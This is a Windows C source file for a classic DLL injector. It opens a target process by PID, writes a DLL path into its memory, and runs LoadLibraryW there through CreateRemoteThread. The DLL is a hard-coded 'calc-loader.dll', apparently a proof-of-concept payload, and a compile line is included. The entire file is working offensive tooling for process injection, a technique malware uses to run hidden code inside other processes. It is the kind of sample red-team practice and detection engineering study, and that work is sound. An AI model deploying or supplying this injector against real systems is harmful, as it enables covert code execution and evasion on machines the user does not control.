#include <stdio.h>
#include <Windows.h>

/*
    Compile
    cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG load.cpp /link /OUT:load.exe /SUBSYSTEM:CONSOLE /MACHINE:x64
*/

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define cool(msg, ...) printf("[>] " msg "\n", ##__VA_ARGS__)

BOOL load(LPCWSTR DLLPath, DWORD pid, size_t dllSize)
{
    HANDLE hProcess = NULL;
    HMODULE k32Handle = NULL;
    PVOID loadLibrary = NULL;
    PVOID dataAddress = NULL;
    DWORD oldData;
    HANDLE thHandle = NULL;
    DWORD threadId = 0;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        warn("Failed to get a handle of the process; Got @--0x%x", GetLastError());
        return FALSE;
    }
    info("Opened a handle to the process %d", (int)pid);

    k32Handle = GetModuleHandleA("kernel32.dll");
    if (k32Handle == NULL)
    {
        warn("Failed to get a module handle of kernel32.dll ; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    info("Opened a handle of kernel32.dll");

    loadLibrary = GetProcAddress(k32Handle, "LoadLibraryW");
    if (loadLibrary == NULL)
    {
        warn("Failed to get the address of LoadLibraryW; Got  @--0x%x", GetLastError());
        return FALSE;
    }

    dataAddress = VirtualAllocEx(hProcess, dataAddress, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (dataAddress == NULL) {
        warn("Failed to Allocate Buffer in the remote Process Memory; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    info("Allocated memory!");

    if (!WriteProcessMemory(hProcess, dataAddress, DLLPath, dllSize, NULL)) {
        warn("Failed to Write on Process Memory; Got  @--0x%x", GetLastError());
        return FALSE;
    }
    info("WriteProcessMemory Success!");

    if (!VirtualProtectEx(hProcess, dataAddress, dllSize, PAGE_READONLY, &oldData)) {
        warn("Unable to Change Protection on Memory");
        return FALSE;
    }
    info("Updated Memory to PAGE_READONLY");

    thHandle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, dataAddress, 0, &threadId);
    if (thHandle == NULL)
    {
        warn("CreateRemoteThread failed; Got  @--0x%x", GetLastError());
        return FALSE;
    }

    cool("Created a Remote Thread, DLL will be injected soon");
    WaitForSingleObject(thHandle, INFINITE);

    //CloseHandle(thHandle);
    //CloseHandle(hProcess);
    //CloseHandle(k32Handle);
    //VirtualFree(dataAddress, 0, MEM_RELEASE);
    return TRUE;
}

int main(int argc, char* argv[]) {

    if (argc < 2) {
        info("Usage: %s <PID>", argv[0]);
        exit(0);
    }

    WCHAR DLLPath[] = L"C:\\Tools\\calc-loader.dll";
    DWORD PID = atoi(argv[1]);
    load(DLLPath, PID, sizeof(DLLPath));
    return 0;
}